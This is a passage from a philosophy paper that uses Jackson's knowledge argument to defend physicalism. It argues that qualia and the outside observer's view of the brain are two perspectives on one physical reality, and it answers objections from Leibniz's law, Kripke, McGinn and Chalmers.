Similarly , since a red quale is only one of two perspectives on the particular part of physical reality that it is , it is both valid and necessary to distinguish it as the reality as known as distinct from the reality as such .
To fail to do so is to implicitly assume that this limited view of the reality in question is the reality in question .
It is to assume that there is no more to the reality in question than is known via this limited perspective - effectively , that there is no wider outside observer 's flesh , blood and brains perspective on the reality in question .
But if physicalism is true , then a red quale ' just is ' something physical , which means that there must be more to knowing it than is known of it via the red quale .
If physicalism is true , therefore , it must be the case both that the red quale is really nothing over and above some physical reality and that it is nevertheless the reality in question as known as distinct from the reality as such .
As I shall show below ( 9.2 ) , these positions may appear contradictory but are , in fact , entirely compatible with each other .
They are , moreover , the key to resolving a number of conundrums associated with the mind - body problem ( see 8.1 - 8.4 below ) .
6.8
If the outside observer 's view of it is also the reality as known as distinct from the reality as such .
This is essentially the same argument as that presented in 6.7 , although there are also additional supporting factors in this case .
If physicalism is to survive Mary 's new knowledge - a red quale in the instance described above - then the red quale must ( as argued in 6.5 ) be an entirely physical thing known to an outside observer as a subset of the flesh , blood and brains view of the organism .
Since this view is made up of such things as electrochemical reactions and firing neurons , it clearly does not encompass the red quale perspective on the physical reality in question .
Like the red quale perspective itself , it is an incomplete view of the underlying reality - so that it is , once again , both valid and necessary to distinguish it from the reality as such by categorising it as the reality as known .
To do otherwise is to mistake a particular perspective on the reality in question for the reality itself .
In this instance , there is additional supporting evidence for the position .
Although I have focused for the sake of simplicity on the idea that Mary 's new knowledge is only knowledge of the colour red , in reality she would , on leaving her black and white room , begin to experience everything - including the outside observer 's flesh , blood and brains view of other humans - in colour .
Clearly , therefore , this view is itself a private perspective in the experience of an outside observer and hence , must be something other than the reality of the other human that the outside observer is observing .
Moreover , it should , in any case , be self - evident that the outside observer 's physical view is the reality as known as distinct from the reality as such .
In this instance , the observer is clearly physically distinct from the reality observed and can only have access to it via his own senses and thoughts which , since he is an outside observer , can only , by definition , be something other than the reality itself - the reality as known as distinct from the reality observed .
7. Only One Solution to the Mind - Body Problem can save Physicalism .
What emerges from this is a perspective on the relationship between qualia and the physical in which :
7.1 A quale is both :
� Really nothing but an entirely physical aspect of the reality of the living human organism known by an outside observer as a subset of the flesh , blood and brains view of the organism
� The reality as known as distinct from the reality as such � an inside observer�s limited view of the physical reality that �just is � the quale .
7.2
The outside observer 's perspective is also the reality as known as distinct from the reality as such - an outside observer 's experiential perspective on a single reality with two sets of characteristics , one experienced and observed by an outside observer of the living human organism , the other experienced and observed by an inside observer of the living human organism
7.3 Since each perspective is a product of a different mode of observation , each can exist without the other .
Indeed , they will exist together only in highly unusual circumstances - for example , in circumstances where a scientific observer is making a specific effort to observe both his own brain via a video camera as an outside observer of it and directly stimulating the physical event that is the quale ( to himself as inside observer ) .
7.4
The outside observer 's flesh , blood and brains perspective does not give rise to or transform itself into the inside observer 's perspective .
The flesh , blood and brains perspective is what the quale is ' really like ' when experienced and observed by an outside observer , but it is a way of knowing the reality of the quale that exists in an outside observer 's experience , not the reality of the externally observed quale as such .
The inside observer 's perspective is what this underlying reality is ' really like ' when experienced by an inside observer and is also this reality as known as distinct from the reality as such .
It is another observed characteristic of the reality that underlies the flesh , blood and brains perspective and it is this underlying reality that gives rise to it .
It is a characteristic of that reality , not a characteristic of the flesh , blood and brains view of it ( which is , after all , only a view of that reality in the experience of another observer ) .
One set of experienced characteristics ( those of an external observer of the reality underlying the quale ) does not give rise to , or transform itself into , another ( those of an internal observer of the organism that encompasses the quale ) .
Instead , the underlying reality is the ' root cause ' of both sets of characteristics .
7.5 Scientific study of this underlying reality is based on observations made by an external observer of it , but it is the reality itself that is studied .
The observation is done via the outside observer 's flesh , blood and brains view of the reality , but it is the underlying reality whose behaviour in various different experimental circumstances is observed and then described verbally in the form of true statements about the physical quale to give us a complete propositional account of its nature .
This complete propositional account explains every characteristic of the whole of the underlying reality in every physical circumstance :
� Since it is entirely verbally expressible , it does not , of itself , encompass the experiential knowledge of what this underlying reality is really like to an outside observer - the non-verbal experience entailed within the outside observer 's flesh , blood and brains perspective on that reality .
Used in conjunction with this experiential view , however , it does explain why it is like it is in these circumstances .
It explains the characteristics of the outside observer 's experienced flesh , blood and brains view of the quale in the only way possible - by specifying what physical things have these characteristics , how they differ from other physical things that do not , and how these differences account for the differences in the experienced characteristics of the physical things in question .
� Similarly , since the inside observer 's perspective must , if physicalism is true , be really nothing but that underlying physical reality , the complete propositional account of the underlying reality , whilst it cannot , being an entirely verbal account , encompass knowledge of what the reality is really like to an inside observer , can ( since it does encompass the whole of the reality and is a complete propositional account of its nature ) explain why it is like that .
It can explain the characteristics of the inside observer 's experiential view of the quale ( experienced redness for example ) in the same way as it explains the characteristics of the outside observer 's experienced flesh , blood and brains view .
It can specify what physical things have these characteristics , how they differ from other physical things that do not , and how these differences account for the differences in the experiential characteristics of the physical things in question .
It can , moreover , answer in the same fashion , related questions like why experience exists at all .
7.6
The complete propositional account of the underlying reality should entail sufficient information to enable the reality to be re-created , together with all of its characteristics , the inside observer 's experiential view , as well as the outside observer's .
A human scientist would , no doubt , need the outside observer 's experiential perspective to be available to him in order to be able to translate this information into the actual operation of re-creating the reality .
However , an alien with entirely different sensory system should also be able to re-create the reality in a human , provided it could accurately and exhaustively map its own outside observer 's sensory perspective on the human to the propositional account .
This does not mean , however , that the complete propositional account , of itself , encompasses a complete physical account of the quale .
Since :
� If physicalism is true , experiential knowledge must be valid knowledge of the physical that cannot be expressed verbally and must therefore be included in any complete physical account as experiential knowledge .
� An alien with different sensory systems who had a complete propositional account of the whole human organism could not have a complete view of the physical reality of the organism because it would not know that it was characteristic of that physical reality that it experienced the world , including itself , in these ways .
� It is impossible to fully explain why the human organism is like it is without encompassing what it is like to both an internal and an external observer and mapping each to the other and to the propositional account .
It follows that a complete physical account of the quale must encompass , not only the complete propositional account , but also :
� The experiential perspectives of both the outside observer and the inside observer ;
� A mapping of each to the other and to the propositional account .
The potential importance of this analysis and its outcome will , I think , be evident .
If the arguments presented hold , the clear implication is that if :
� Physicalism is true ;
� Mary learns something new on leaving her black and white room ;
� All true statements about the physical can be learned inside a black and white room ;
then the relationship between qualia and the physical described above must be the solution - or , at minimum , the core of the solution - to the mind - body problem .
Moreover , since :
� Physicalism itself has so far proved itself adequate to deal with every other aspect of reality we have studied over many centuries ;
� Both the claim that Mary learns something new on leaving her black and white room and the claim that all true statements about the physical can be learned inside a black and white room are themselves plausible ( see end of section 5 above ) ;
there are arguably good grounds for holding , as a working scientific hypothesis , that this view of the mind - body relationship is the correct view of that relationship .
8 Additional Support for this Perspective on the Relationship between Qualia and the Physical
As may be evident from the description in section 7 above , further support for the account can also be found from sources beyond the knowledge argument .
As follows :
8.1 Leibniz 's Law .
Since the position proposed here is clearly a form of identity theory , a look at how it relates to Leibniz 's law on the identity of indiscernables will make a good beginning .
The law states that if x is y , then any property of x is a property of y .
This would be a problem if the claim being made was that Mary 's new experiential knowledge of red was identical to some part of the ' flesh , blood and brains '
Mary as observed by outside observers of her .
If the claim was that Mary 's red quale was identical with or really nothing over and above what the outside observer of Mary , given suitable equipment , knew as a few interconnected brain cells ( say ) .
It is clear that redness is not a property of what Mcginn 1989 has termed the ' soggy grey matter ' of Mary 's brain as an outside observer would know it , and equally clear that greyness and soggy solidness are not characteristics of Mary 's experienced red .
This , however , is not what is being claimed here .
The claim is that some part of the reality that underlies what an outside observer of Mary knows as the Mary of flesh , blood , brains and cells is the same reality that Mary knows as experienced red .
The identity resides in this underlying reality - and the experienced red that Mary knows as an ' inside observer ' of it , and the soggy grey matter that others know ( or experience ) as outside observers of it , are both characteristics of the underlying reality in question .
There is thus no conflict with Leibniz 's law , either in this respect or in any other :
� The fact that ' experienced redness ' is not a property of the ' soggy grey matter ' of Mary 's brain and vice versa is not a problem , because both are characteristics of this single underlying reality that is the real basis of the identity .
� The fact that public observability is not a property of experienced redness , and private observability is not a property of soggy grey matter , and that anything public is , by definition , not private , and vice versa , is not a problem .
There is no difficulty because it is characteristic of the single underlying reality , both that it can be known publicly , and that it can be known privately .
� The fact that every aspect of what the outside observer knows as soggy grey matter has a precise location in physical space and the experienced red known by Mary , the inside observer , is impossible to locate in physical space is not a problem .
Again , locatability in public space and knowability in terms of private experiences that cannot be so located are both characteristic of the underlying reality in which the identity resides .
The reality known by an inside observer as a private experience can be located in public space when known and observed publicly by outside observers .
It is simply that , when it is known privately , it is known in a way which makes location in space impossible .
8.2 Kripke 's Problem for Proposed Identities .
Because the position proposed in this paper is a kind of identity theory , a question arises about how it deals with a problem raised by Kripke ( 1980 - see also Chalmers 1996 on this topic ) .
According to this , Leibniz 's Law demands that if A is B then A is necessarily B .
There are no circumstances in which this is not true - it is true in all possible worlds .
There are examples in the world of identities where this may appear to be false - where it appears we can conceive of possible circumstances in which the identity does not hold .
However , if there is true identity , these must arise from a misconception of some kind , and it will be possible to discover and specify the basis of the misconception .
If we propose an identity for which it is possible to propose plausible circumstances in which it does not hold , but not possible to give an equally plausible account of why these conceivable circumstances do not threaten the identity claim , then there are clear grounds for abandoning the claim .
If A and B are identical - if they are in all cases inseparable from each other - then there can be no circumstances in which the two can be conceived of as separate that are not based on a misconception .
If there are such circumstances , then we have evidence that the two are separable and so cannot reasonably be thought of as identical .
Water and H2O provide a good illustration of this point .
If water really is identical to H2O - and it is - then there are no circumstances in which water can exist and not be H2O , they just are the same thing and cannot ever exist separately .
It appears that we can conceive of a situation in which this is not true , but this is based on a misconception .
Thus , we can imagine a possible world in which water is not H2O but XYZ - but this , to quote Chalmers ( 1996 ) , is illusory .
In fact , we are conceiving of a situation in which there exists something that has all the properties we normally associate with water , but is not actually water .
It therefore does not present a problem for the assertion that water is H2O , because it is not an instance of water not being H2O , only an instance of something like water not being H2O .
This is an illustration of a situation in which the identity only appears to be threatened .
An illustration of the opposite situation - in which there is genuine evidence that the claimed identity must be abandoned - is a proposed identity between pain and ( say ) firing c-fibres in the brain .
If the two truly are identical , then it should either be impossible to conceive of situations in which the two are not identical or , if it is not , it should be possible to give a plausible explanation of why these situations do not provide evidence against the proposed identity .
In fact , in this instance , it seems to be possible to conceive of such situations , but not to explain why they do not provide evidence against the proposed identity .
The idea of disembodied pain seems to us to be plausible , as does the idea of a zombie who has the firing c-fibres , but no feelings .
In this case , we cannot plausibly argue that we are mistaking something like pain for pain itself or something like firing c-fibres for actual firing c-fibres .
Pain is pain .
Something that feels like pain just is pain , it cannot plausibly be regarded as something that feels like pain but is not pain in fact .
We therefore have a plausible circumstance in which actual pain is separable from firing c-fibres and , hence , evidence against the identity claim .
Similarly , firing c fibres are either firing c-fibres or they are not .
It is actual firing c-fibres that we can plausibly regard as being disassociated ( in zombies ) with feelings , not something that seems like c- fibres but is not .
In this circumstance , therefore , there is , it appears , evidence that the identity does not hold .
The identity I have proposed here , of course , is between the reality underlying our outside observer 's flesh , blood and brains view of the relevant aspect of the human organism and the reality known by an inside observer as a quale ( as pain or experienced red ) - the claim that there is one reality that can be known in two different ways .
Not only that , but it is entirely possible for it to be known in one way at a particular point in time , but not known in the other .
An ' inside observer ' of the human organism may know it as an experience but not as something made of the soggy grey matter of the brain , and an outside observer may know it in this way but not as an experience .
It is also extremely difficult for one person to have and hold both views of the reality in question at the same time .
It is therefore entirely possible that we should regard disembodied experiences and zombies without feelings as plausible but this does not mean that the proposed identity is threatened .
Because the underlying reality can be known in these different ways separately , and probably cannot easily be known in these different ways simultaneously by any one of us , it is no surprise that we consider it plausible that one could exist without the other - but this does not mean we are right to do so .
Clearly , each of the two ways of knowing can and do exist without the other if the observational circumstances dictate this , but this is not plausible evidence against these simply being different ways of knowing one underlying reality and does not , I submit , threaten the form of identity proposed in this paper .
8.3 " Soggy Grey Matter " : A Sub-set of " Technicolor Phenomenology " .
This distinction between the ' soggy grey matter ' of Mary 's brain as observed by an external observer of Mary and the actual reality underlying it is an important one in other respects .
Colin McGinn ( 1989 ) has famously asked ' How can technicolor phenomenology arise from soggy grey matter ? ' , suggesting that physical matter is so different from something like experienced redness that it is impossible to conceive of how qualia could possibly ' arise ' from the physical reality of the flesh , blood , brains , cells , and atoms of the living human organism and arguing that the mind - body problem may ultimately be irresolvable .
However , if the perspective suggested by the analysis in this present paper is correct , his question is expressed in a misleading way .
The desire to explain the ' technicolor phenomenology ' of the world of consciousness and qualia in physical terms is sound , of course , but it is misleading at best to express it in the terms used by McGinn .
It is the reality of the human organism that ' gives rise to ' McGinn 's ' technicolor phenomenology � ; although it might be more correct to say that the technicolor phenomenology is a characteristic of that reality .
The success of science as a means of acquiring reliable knowledge is based on observation and measurement by outside observers of the human organism .
The human organism when observed from the outside is known as something made of flesh , blood , cells , atoms , and soggy grey matter .
It therefore seems natural to think of the flesh , blood , cells , atoms , and soggy grey matter as the reality of the human organism and to ask how this ' gives rise to ' the technicolor phenomenology that is evident when we know this reality as inside observers - natural , but incorrect .
What science observes and measures in the public world in respect of the human organism is undoubtedly the reality of the human organism ; there is no question about that .
Nor is there any doubt that what we know when we observe and measure the human organism in the public world - the soggy grey matter , the flesh , blood , cells , and atoms - is what the human organism known by an outside observer is ' really like ' .
What science observes and measures really is the physical human organism , and it really does have the subdivisions ( and subdivisions of subdivisions ) that we discover when we examine it in depth .
And what we observe and measure is the reality of the human organism .
If it were not , science would not be successful in acquiring reliable knowledge about it in the way that such things as medical advances show that it clearly is .
When we talk about soggy grey matter , however , and about the fleshiness of flesh , the solidity of bones , the redness of blood and so on , we are not referring to the reality of the organism itself .
What we are referring to is that reality as experienced by outside observers of the human organism .
We are describing , not the reality itself , but how the reality of the human organism observed in the public world affects the private experience of the various human observers .
These private experiences - from the redness and stickyness of blood to the soggyness and greyness of the brain - do not give rise to McGinn 's technicolor phenomenology .
On the contrary , they are themselves part of the technicolor phenomenology we are seeking to explain .
We cannot conceive how this technicolor phenomenology can arise from soggy grey matter because the question itself misdirects us :
� It creates an artificial gulf between � the mental� and � the physical � by associating each with aspects of the technicolor phenomenology that have very different ' feels ' and then taking these very different feels as evidence of a major gap between the two - when , in fact , both are just different aspects of what we are trying to explain .
� It asks , in effect , how one set of private experiences ' gives rise to ' another - how one way of knowing the reality of the human organism gives rise to another way of knowing it .
Arguably , misconceptions of this kind are one reason why there is felt to be an ' explanatory gap ' between the physical and the phenomenological .
In fact , our ' soggy grey matter ' ( the experience , as opposed to the reality that underlies it ) is as much a facet of McGinn 's technicolor phenomenology as is a red quale or an imagined unicorn .
All are characteristics exhibited by the reality of the human organism in particular circumstances , and it is not sensible to ask how one gives rise to another .
Rather , we should ask how the discovered nature of the actual reality examined and measured by science - by observing the effects of placing it in various controlled experimental conditions on the private experiences of human observers - accounts for all of these aspects of our technicolor phenomenology , including those aspects we refer to as ' soggy grey matter ' .
8.4 The ' Hard Problem ' Resolved .
Others who have addressed the problem of giving a satisfactory physical account of the world of consciousness and qualia , have also seen a gulf between the two that at times has seemed unbridgeable .
One of these is David Chalmers , who has identified what he has described as the ' hard problem ' of consciousness .
For Chalmers , this problem is uniquely hard .
So hard that what we have come to regard as normal scientific explanation will not do , and it is necessary to resolve the difficulty by taking experience itself as a fundamental feature of the world alongside mass , charge , and space - time .
In fact , if the perspective on the mind - body relationship that emerges from the analysis of the Knowledge Argument presented in this paper is correct , this is not true .
There is no hard problem , and no need to take the relatively drastic step proposed by Chalmers .
If I understand him correctly , what Chalmers refers to as ' the hard problem ' ( 1995 ) has three aspects :
� There is something it is like to be a human organism - something it is like to entertain a mental image or experience an emotion .
If we can give a scientific account of everything we can as external observers observe about a rock or an automobile , we can be fairly confident that we have given a full account of it , but this is not the case with the human organism .
If we compile a full scientific external observer 's view of the human organism then there is still something left to explain - why is the fact of being this physical organism accompanied by experience ?
Why is there ' something it is like ' to be a human organism - to entertain a mental image or experience an emotion ?
Why is being a human organism ( and possibly other advanced organisms ) ' like ' anything ?
� This experiential aspect of the organism is not reducible to the physical as we presently understand it and , in such circumstances , ' non-reductive explanation is the natural choice '
� The ' hard problem ' - explaining why there is ' something it is like ' to be a human organism , or to entertain a mental image or experience an emotion - is not susceptible to any explanation based on the physical as we presently understand it .
Consequently , a theory of consciousness must and should take experience itself as a fundamental feature of the world alongside mass , charge , and space - time .
As may be evident from 7.5 above , however , the perspective described in this paper offers another simpler account , more compatible with the physicalist view as currently held by most scientists .
According to this perspective , the knowledge content of the inside observer 's experiential view of a quale is irreducible to the knowledge content of the outside observer�s view of it .
However , there is no more to the reality of the quale than there is to the reality known by an outside observer as an entirely physical thing , simply more to knowing it than is known by an outside observer knowing it in this way .
There is an additional experiential view of this single entirely physical reality that is accessible only to an inside observer of it , and is irreducible to an outside observer 's view of it .
However , this additional view is nevertheless wholly encompassed within the entirely physical reality underlying the outside observer�s view .
It is not an additional part of the reality over and above that known by an outside observer ( the quale is both the reality as known as distinct from the reality as such and really nothing but the reality as such ) .
In this perspective :
i . There is a single reality underlying the view held by both observers .
A quale is what this underlying reality is �like� when experienced by an inside observer of the human organism it occurs in , and an aspect of the flesh , blood and brains view of the organism is what it is �like� when experienced by an outside observer .
Each is a characteristic of the underlying reality and can be accounted for via a scientific study of that reality
ii .
There is no �hard problem� of consciousness .
A scientific study of the underlying reality would be considered sufficient to account for what the reality is like to an outside observer experiencing it in terms of the flesh , blood and brains view of the organism .
There are no grounds for holding that it cannot also be considered sufficient to account for what the reality is like to an inside observer experiencing it as a quale ( or , indeed , for why it is like anything at all ) .
We can account for the characteristics of the underlying reality as experienced via the inside observer�s quale in the same way as we can account for its characteristics as experienced via the flesh , blood and brains view of the organism : by specifying what physical things have these characteristics , how they differ from other physical things that do not , and how these differences account for the differences in our experience or , indeed , for the very existence of experience .
iii .
Experience is not �left out� of the scientific account , as is sometimes the case with physicalist accounts .
The experiential element of any and every quale must be encompassed as an experience in any scientific account claimed to be complete .
This is so for two reasons :
� Since the experiential element cannot be expressed verbally without loss , it can only be encompassed as an experience , and since , if physicalism is true , it must be valid knowledge of the physical , it cannot justifiably be left out of any account claimed to be complete
� Any account that attempts to explain experience must encompass what it aims to explain � which is to say , experience itself .
Once this is recognised , it becomes clear that there is no mystery here � no problem that is particularly hard .
A quale is an entirely physical thing that also happens to be the basis of human experience .
Different essential experiences ( redness , sweetness etc. ) have small physical differences that account for the differences in the associated experiences .
All qualia have one or more physical features that make them different from other physical realities that lack an experiential characteristic � differences that explain why being a human organism or , indeed , any �higher� animal is �like� anything .
A verbally expressible account of these differences is a complete account of the differences themselves , sufficient to allow an outside observer of a given human to re-create a physical environment inside that human which exhibits ( to � the inside observer� of the human in question ) the experiential characteristic they give rise to .
Of itself , it is not sufficient to account for why being human is �like anything� , but only because a purely verbal account cannot encompass experience � the very thing we are seeking to explain .
If a purely verbal account - or an explanation in terms of what Chalmers calls � the physical as we presently understand it � � fails to explain why being human is like anything , it is not because the explanation itself is insufficient .
Nor is it because it fails to encompass some aspect of the underlying reality in its account .
It is because , being purely verbal , it fails to encompass knowledge of what the reality is �like� to an inside observer and so cannot complete the account .
If a stone and a human are different because there is a �something it is like� to be a human but not a �something it is like� to be a stone , a physical account of humans that does not encompass this �something it is like� is incomplete for two reasons .
First because it misses out a crucial part of the physical description of humans that indicates how they differ from stones .
Second because , as a result , it cannot then encompass a prepositional explanation of why they differ in this way .
The problem , however , is not a lack of prepositional information , but the inability of verbally expressible prepositional information to encompass the very characteristic that needs explaining - a problem easily resolved by simply encompassing experience within our complete knowledge of the reality in question .
With the experiential characteristic encompassed within the total view as an experience , our account can state � these physical things are unique in having �this� experiential characteristic and this , in propositional terms , is why .
Without it , our account cannot adequately encompass how they are different , and can not � because of this � state why .
iv .
The problem of experience can be solved without taking experience itself as a fundamental feature of the world , alongside mass , charge , and space - time .
It does become a characteristic of this world - an attribute of certain physical things , likely to alter our perception of � the physical� - but it need not be added as a fundamental feature .
At worst , there will turn out to be a requirement to add a fundamental feature to our current view of the physical world as a result of our attempts to explain what it is about the reality underlying a quale that explains experience .
However , should such a requirement arise , the new fundamental feature will not be experience itself but something more similar to space , charge or space - time ( an entirely different proposition , more likely to find acceptance with within the scientific community ) .
This kind of explanation will not answer those who wish to ask ( for example ) why the universe is such that there are some physical things that are also qualia - questions of the kind that require us to choose between answers like ' god made it that way ' or ' it was just a matter of chance , strange as it may seem ' .
Such questions , however , are of a type that scientists are usually content to leave to others , preferring to focus on the more practical considerations that an explanation of this kind can and does address - including , for example , how can we build or otherwise create something that has these characteristics ( like a conscious robot should such a thing be non-organically feasible ) .
The kind of explanation presented above will suffice for these purposes , and will , I believe , be regarded by most scientists as entirely satisfactory .
9 Final Points .
Up to this point , I have considered only points in favour of the perspective on the mind - body relationship proposed in this paper .
In this final section , I want to conclude my case by considering some aspects of the position that raise questions and to show that there are reasonable answers to these questions � that the difficulties they seem to point up are more apparent than real .
There are apparent difficulties with the view in five areas :
9.1
There is the appearance of self - contradiction in a position that asserts both that any given quale is really nothing but , or entirely reducible to , some physical reality and that there is more to knowing it than the complete set of true physical statements about the physical thing in question .
If there is only a single reality involved , and a complete external observer�s knowledge of that reality entirely encompasses all of that reality , how can it be possible that the inside observer 's way of knowing that reality entails additional knowledge content ?
This seems problematical because :
� On the one hand , if the reality encompassed by the inside observer 's knowledge is entirely encompassed within the complete external scientific observer 's knowledge , it can not be true that there can be additional knowledge content in the inside observer 's view due to an additional part or aspect of reality being known .
� On the other , we have centuries of experience that seem to show that the complete external scientific observer 's knowledge of anything else in the universe is a complete knowledge of the thing in question , sufficient to account for every aspect of its observed behaviour .
From this , it seems to follow that , even if we have reason to believe , in the case of the human organism , that the inside observer�s view entails an additional perspective , we can have no reason to suppose that this would entail additional irreducible knowledge content .
In fact , while the first of these points is undeniably correct , and will not be disputed here , the second is not .
It is entirely possible to suggest plausible circumstances in which it will not hold true - and to do so without disputing the claim that the complete outside observer 's propositional knowledge is sufficient to account for every aspect of observed behaviour .
Notice that it is true of any reality in the world , that an outside observer can only ever know it in relation to other things :
� His own sensory experience of it , with or without the enhancements possible through instrumentation ;
� Its size in relation to some physical constant ;
� Its position in space relative to other objects and some accepted frame of reference ;
� Its behaviour or nature in relation to particular experimental circumstances and our physical and chemical theories ;
� And so on .
Notice also that in the case in question it is entirely plausible to suggest that an inside observer knows qualia more directly than this .
In this case , there is no physical separation between the observer and the observed or the knower and the known , so that it is , at least , possible that the inside observer knows qualia , not in relation to other things , as an outside observer must , but non-relationally - that they are known as is , by direct acquaintance , in relation only to themselves .
Non-relational knowledge would have minimal information content , and would not and could not entail any knowledge that could be used to predict behaviour ( if the thing known is known only in relation to itself , nothing can be known about its behaviour since this implies relationships to other things ) .
However , it is entirely plausible that it should contain knowledge content that is irreducible to an outside observer 's relational knowledge .
To know something relationally is to know it indirectly , in relation to other things or perspectives , and so ( perforce ) to know it other than directly and non-relationally by direct experience .
It is also entirely plausible to suggest :
That relational knowledge is verbally expressible knowledge - that its content can be expressed entirely in terms of labels for things and relationships observed in the world by an outside observer .
That non-relational knowledge acquired by direct experiential acquaintance cannot be expressed verbally without loss of knowledge content .
On the one hand , its content , being a single non-relational experience , cannot be expressed in terms of relationships to other things .
On the other , a label such as ' red ' that we might assign to it cannot , being verbal , entail the experiential knowledge itself ( Mary in her room could acquire the label but not the experience ) .
- a further indication that it is entirely plausible that it should contain knowledge content that is irreducible to an outside observer 's relational knowledge .
9.2
There is also the appearance of self - contradiction in a view that asserts both that any given quale is really nothing but , or entirely reducible to , some physical reality and that it is nevertheless the reality in question as known as distinct from the reality as such .
It may appear that there is a contradiction here .
On the one hand , there is an assertion that the quale is nothing but or nothing over and above some physical reality � that it simply is that reality .
On the other , there is an additional assertion - that the quale is the reality of that one thing as known - which may seem to imply that there are two things ( the reality as known and the reality itself ) .
In fact , it is entirely possible that both assertions are true .
A solid plastic cube has a characteristic we might describe as its ' cubishness ' .
This ' cubishness ' is embodied by the solid plastic cube itself - in reality , it is ' nothing but ' the solid plastic cube .
We can safely say that there is no more to this cube 's ' cubishness ' than the cube itself - that it just is that cube .
But suppose the cube then exhibits a new characteristic which we can call ' squeeginess ' ?
Suppose that , as its temperature gradually rises , it loses its cuboid cohesion and ' melts into ' a series of new shapes that are progressively more rounded and lumpy and less cube - like ?
Do these two sets of circumstances not illustrate a situation in which it is accurate to say that ' cubishness ' is nothing over and above the reality of the solid plastic cube , but also accurate to regard it as one perspective on that cube - in effect , one limited way of knowing it ?
Do they not also illustrate a situation in which - despite the fact that the ' cubishness ' is , in real terms , nothing but the reality we are distinguishing it from - it would be both , accurate to distinguish between the reality of the cube itself and the ( one , limited ) ' cubishness ' perspective on it , and necessary to do so ?
This is all that is being asserted here about qualia .
The claim is that any given quale is entirely embodied by an aspect of the physical reality of the human organism , but that it is nevertheless both accurate and necessary to distinguish between the reality itself and its ' qualeishness ' .
The �qualeishness � is the reality , but the view of the reality it affords us is only one of two limited perspectives on it .
It is therefore both accurate and necessary to distinguish between the reality as known ( the �qualeishness � ) and the reality as such , even though there is no actual physical distinction between them .
The claims made here regarding qualia are thus entirely plausible - it is not necessarily a contradiction to claim both that a quale , considered as a reality , is really nothing over and above some part of the physical human organism , and that , considered as a way of knowing , it is the reality as known rather than the reality as such .
9.3
The idea that a quale , known experientially as a quale , is an �inside observer�s� perspective on an aspect of the physical reality of the living human organism may appear to be a problem for a position claimed to be scientific .
Observation is the basis of all science , and nothing like a quale has ever been observed inside the flesh , blood and brains view of the organism , nor is ever likely to be .
In fact , there is no problem here , only a need to clarify the relationship between the two perspectives .
The inside observer�s perspective is a perspective whose existence is inside the reality of the aspect of the physical human organism in question , but it is not inside the outside observer�s view of that reality as a subset of the flesh , blood and brains perspective on the human organism .
The outside observer�s perspective is not the reality that contains the inside observer�s perspective , it is itself a way of knowing that reality that exists in the experience of the physically separate outside observer .
An outside observer�s experiential view of the reality of another human cannot be reasonably held to �contain� the reality itself in any physical sense , only to reflect the observed nature of that reality , so it cannot be reasonably held to contain the inside observer�s perspective either .
In fact , since the outside observer�s perspective on another human is itself one part of the total set of human experiences , it , properly speaking , is a subset of the total inside observer�s experience of human reality , not a �container� for it .
Consciousness is not inside the brain , and we should not expect to observe it ( or the qualia it entails ) there .
On the contrary , � the brain� as experienced by an outside observer is inside consciousness � an accurate , experiential , 4 - dimensional , map of the reality of the organism as known by an outside observer that cannot be reasonably held to contain anything other than smaller and smaller sub-divisions of itself .
9.4
The idea that qualia , known experientially as qualia , should be regarded as valid knowledge of the physical and encompassed in a complete physical account may seem to be unscientific and to undermine the physicalist account we are trying to defend .
In fact , this proposed inclusion of experiential knowledge in a scientific account in no way undermines the scientific approach and should not concern us unduly .
Note , first of all , that if we broaden our perspective from that of a single quale to that of the whole human organism , the position as stated in 7.6 above can be restated and expanded as follows :
A complete scientific knowledge of the physical human organism comprises all of the following , but only all of the following :
� A complete set of all true statements about the physical human organism that express the outside observer 's view .
� A complete set of the irreducible non-verbal experiential elements that are valid knowledge of the physical but cannot be encompassed within the set of true statements because they cannot be expressed verbally without loss .
� A mapping of each of these to its externally observable correlate or ( more likely ) correlates in the flesh , blood and brains perspective on the organism , and to all associated true statements .
This follows from the arguments in section 6 and 7 above .
A complete view must encompass all three elements .
If all qualia are valid knowledge of the physical that cannot be encompassed within the set of all true statements about the physical human organism , then they are valid knowledge of the physical that must be added to this set of statements in any view of the physical human organism claimed to be complete .
And if they are simply an inside observer 's private or experiential view of something an outside observer knows in terms of the flesh , blood and brains perspective , then any complete view of the physical human organism must also entail a mapping of these various qualia to their externally observed correlates and all associated true statements .
It must encompass only these three elements because :
� A complete set of all true statements about the physical human organism encompasses all possible propositional knowledge of the physical human organism and cannot be added to propositionally if physicalism is true .
� Physicalism can only survive Mary 's new knowledge if that knowledge is comprised of non-verbal private and experiential elements .
Anything other than non-verbal , private and experiential , qualia would refute physicalism , an important point because it means that , other than such private and experiential non verbally expressible elements , anything of the mental world must be encompassed within the set of true statements about the physical human organism .
In other words , it must be possible to account for all things mental in terms of all true statements about the physical human organism plus ( only ) this additional non-verbal experiential knowledge .
� If the points above are true , only qualia , their flesh , blood and brains perspective correlates , and the true statements about the physical encompassed in the associated prepositional accounts , need be or can be mapped .
This is a view that encompasses qualia as qualia , but it does not , I submit , undermine the scientific approach .
Neither the idea that such experiences can be regarded as valid knowledge of the physical , nor the idea that a completed physical account of the world , including the human organism , must encompass qualia as experiences need concern us unduly .
Regarding qualia as valid knowledge of the physical does not threaten the scientific approach .
On the contrary , if qualia exist , and encompass knowledge of something , considering them as anything other than valid knowledge of the physical means categorising them as valid knowledge of something non-physical , a position that entails the refutation of physicalism .
It is taking the opposite stance that is a threat to the commonly held scientific approach to understanding the world .
And including qualia as experiences in a completed physical account of the human organism is then both , essential and � arguably � non-controversial :
� If qualia are valid knowledge of the physical , they must be included somehow in any scientific account of the human organism that is claimed to be complete .
� If their knowledge content cannot be expressed verbally without loss , they can only be encompassed within such an account as experiences , they cannot be encompassed propositionally .
They are characteristics of that aspect of physical reality we call the living human organism that a purely prepositional account fails to capture .
� If their knowledge content cannot be expressed verbally without loss then it is knowledge content that cannot be either true or false and should not therefore undermine our propositional account of the physical world in any significant sense .
� A completed physicalist psychology would require the inclusion of qualia in this way .
It would require it to permit the mapping of the two aspects of human experience we are all familiar with to each other and to our propositional knowledge of the physical human organism .
The two aspects in question being the inside observer�s perspective on the experience of being human , and the outside observer�s experience of the human organism in terms of the flesh , blood and brains view of the organism .
In short , there are good grounds for holding qualia to be a valid part of a total physical view and it is at least arguable that no significant problems are incurred if we decide to do so .
There may be a consequent requirement that we must be able to determine the existence of distinct private events scientifically , but that is too large a topic to be handled in the current paper .
9.5
There is � or may be � a suggestion that the argument that leads to the perspective proposed here is circular .
The case goes like this :
The perspective on the mind - body relationship proposed here is developed as a result of the Knowledge Argument .
However , if the perspective is correct , then scientists with a complete physical view of the world would know about it , and would teach it to Mary in her black and white room , albeit in terms of black and white experiences rather than colour experiences .
